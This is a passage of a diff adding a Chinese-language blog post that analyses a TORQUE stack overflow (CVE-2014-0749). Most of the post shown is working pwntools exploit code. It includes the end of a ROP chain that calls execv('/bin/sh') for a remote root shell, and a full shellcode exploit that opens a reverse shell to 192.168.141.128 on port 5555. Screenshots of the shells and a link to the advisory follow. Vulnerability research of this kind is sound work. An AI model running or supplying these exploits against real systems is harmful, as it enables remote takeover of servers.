+            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">execv_plt</span><span class="p">)</span>           <span class="c1"># 执行execv("/bin/sh", NULL)获取远程shell
+</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
+<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+
+<span class="n">rp</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>rop方式获取远程root shell：</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/remote_root_shell.png" alt="remote root shell.png" /></p>
+
+<h3 id="shellcode版本关闭nx">shellcode版本（关闭NX）</h3>
+
+<p>shellcode解决方式，要关闭NX，效果是反弹shell到192.168.141.128主机的5555端口：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
+
+<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">172.17.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15001</span><span class="p">)</span>
+
+<span class="n">overflow_distance</span> <span class="o">=</span> <span class="mi">103</span>     <span class="c1"># 实际溢出长度为103
+</span><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x40900d</span>
+
+<span class="c1"># 反弹shell到远程5555端口
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">192.168.141.128</span><span class="sh">"</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">dupsh</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="n">overflow_distance</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> 
+
+<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
+<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>shellcode反弹shell：</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/shellcode%E6%89%93%E6%88%90%E5%8A%9F.png" alt="shellcode打成功.png" /></p>
+
+<h1 id="参考资料">参考资料</h1>
+
+<p>OSS公告：</p>
+
+<p><a href="https://seclists.org/bugtraq/2014/May/75">Bugtraq: [CVE-2014-0749] TORQUE Buffer Overflow</a></p>
+
+<p>torque的编译、安装、部署、使用</p>
+
+<p><a href="https://www.jianghaizhi.com/bckf/1262.html">Torque安装部署以及使用方法详解</a></p>
+
+    </div>
+</article>
+
+                
+                <footer class="footer">
+        <section class="footer__about">
+                <p class="footer__about__copyright">© qts588 2025</p>
+                
+                <span class="divider">·</span>
+                
+                <span class="footer__about__theme"><p>theme</p><a id="simplex-logo" href="https://github.com/andreondra/jekyll-theme-simplex" target="_blank"><img alt="Simplex theme logo" src="http://localhost:4000/assets/img/icons/simplex_logo.svg"/></a><p>by <a href="https://ondrej.golasowski.com/">golas</a></p></span>
+        </section>
+</footer>
+            </main>
+            <script src="http://localhost:4000/assets/js/jquery.slim.min.js"></script>
+<script src="http://localhost:4000/assets/js/lity.min.js"></script>
+<script src="http://localhost:4000/assets/js/tools.js"></script>
+<script src="http://localhost:4000/assets/js/pic.js"></script>
+<script src="http://localhost:4000/assets/js/toc-highlight.js"></script>
+        </div>
+    
+</body>
+</html>
